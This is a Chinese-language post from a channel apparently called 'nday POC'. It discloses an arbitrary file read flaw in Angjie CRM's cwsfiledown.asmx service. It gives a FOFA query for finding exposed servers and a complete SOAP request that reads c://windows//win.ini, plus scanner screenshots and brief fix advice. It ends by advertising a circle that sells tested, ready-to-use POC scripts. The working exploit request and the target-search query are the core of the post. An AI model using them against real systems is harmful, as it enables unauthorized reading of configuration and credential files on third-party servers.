#  昂捷CRM cwsfiledown.asmx 任意文件读取漏洞   
Superhero  nday POC   2024-12-16 02:11  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC  
信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
  
**00******  
  
**产品简介**  
  
  
昂捷CRM（Customer Relationship Management）是深圳市昂捷信息技术股份有限公司  
提供的一款专注于零售行业客户关系管理的系统。旨在帮助零售企业更好地管理客户、提升客户满意度和忠诚度，从而推动业务增长。该系统集成了客户信息管理、会员营销、客户服务等多个功能模块，为零售企业提供全方位的客户关系管理解决方案。  
  
  
**01******  
  
**漏洞概述**  
  
  
昂捷CRM cwsfiledown.asmx 接口DownFileBytes实例处存在任意读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。  
  
  
**02******  
  
**搜索引擎**  
  
  
FOFA:  
```
body="/ClientBin/slEnjoy.App.xap"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwL6icuAfeiaoqbhvCsQAV6s9W7ZtBCD32VwvfV3EX74f8dVesAMQAhpSjfSoBP6MKydsYkn1AkLYOfg/640?wx_fmt=png&from=appmsg "")  
  
  
**03******  
  
**漏洞复现**  
```
POST /EnjoyRMIS_WS/WS/FileDown/cwsfiledown.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/DownFileBytes"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <DownFileBytes xmlns="http://tempuri.org/">
      <sFileName>c://windows//win.ini</sFileName>
      <iPosition>1</iPosition>
      <iReadBytesLen>100</iReadBytesLen>
      <bReadBytes>ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg</bReadBytes>
    </DownFileBytes>
  </soap:Body>
</soap:Envelope>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwL6icuAfeiaoqbhvCsQAV6s9WTFBYtJ2l4Mica9MKfqM3jQx7FhD4icEAJicwkORwVxjQtRxv1lQ61BxicA/640?wx_fmt=png&from=appmsg "")  
  
  
**04**  
  
**检测工具**  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwL6icuAfeiaoqbhvCsQAV6s9W316S9WvMBV0YIFPAyyjT4AB5nc7UdLjTuamuSfJpmCQhopbLJdulrg/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwL6icuAfeiaoqbhvCsQAV6s9WHg2dGDNRwbovzspiane9JnTxznQUMaUVKicvzQiaJVr35icJzsaom9WBvw/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwL6icuAfeiaoqbhvCsQAV6s9WQF6tX1ibJWGrhJBhz3GaSzGzZmoK9AhlWzCBwaQDzsdaBXib5hKHR1NA/640?wx_fmt=png&from=appmsg "")  
  
  
**05******  
  
**修复建议**  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、升级至安全版本  
  
  
**06******  
  
**内部圈子介绍**  
  
  
1、本圈子主要是分享网上公布的1day/nday POC详情及对应检测脚本，目前POC脚本均支持xray、afrog、nuclei等三款常用工具。  
  
2、三款工具都支持内置poc+自写poc目录一起扫描。  
  
3、保持每周更新10-15个poc。  
  
4、所发布的POC脚本均已测试完毕，直接拿来即用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
  
